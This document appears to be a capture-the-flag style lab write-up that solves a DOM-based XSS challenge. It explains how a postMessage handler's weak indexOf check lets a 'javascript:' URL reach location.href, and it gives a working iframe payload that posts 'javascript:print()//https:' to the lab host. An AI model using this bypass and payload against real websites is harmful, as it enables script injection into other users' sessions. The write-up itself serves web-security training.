## DOM XSS using web messages and a JavaScript URL

This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

## Notes

- Possibility to leave a comment on a post
- Exploit Server
- ads feature
- EventListener for message in home page

## Resume

1. Inspect the JavaScript code
2. Identify the vulnerable `postMessage()` handler
3. Bypass the weak `indexOf()` validation
4. Send a `javascript:` payload through `postMessage`
5. Trigger XSS via `location.href`

## Solve

The application listens for messages using `window.addEventListener('message')`:

```html
<script>
window.addEventListener('message', function(e) {
    var url = e.data;

    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
</script>
```

The vulnerability comes from the validation logic:

```javascript
if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1)
```

Instead of verifying that the URL actually starts with `http://` or `https://`, the application only checks if the string contains `http:` or `https:` anywhere inside the payload.

This means we can inject a malicious `javascript:` URL while simply appending `https:` somewhere in the string to bypass the filter.

The payload is directly assigned to:

```javascript
location.href = url;
```

Since `location.href` accepts `javascript:` URIs, arbitrary JavaScript execution is possible.

```html
<iframe
    src="https://0a26009c0380b8d280ffbc7200200095.web-security-academy.net/"
    onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
</iframe>
```

The payload sent through `postMessage()` is:

```javascript
javascript:print()//https:
```

Breakdown:

- `javascript:print()` → executes JavaScript
- `//https:` → comment containing `https:` to satisfy the weak validation

The application sees the substring:

```text
https:
```

so the condition returns `true`:

```javascript
url.indexOf('https:') > -1
```

The payload is then assigned to:

```javascript
location.href
```

which executes:

```javascript
print()
```

resulting in XSS execution.

```html
<iframe
    src="https://0a26009c0380b8d280ffbc7200200095.web-security-academy.net/"
    onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
</iframe>
```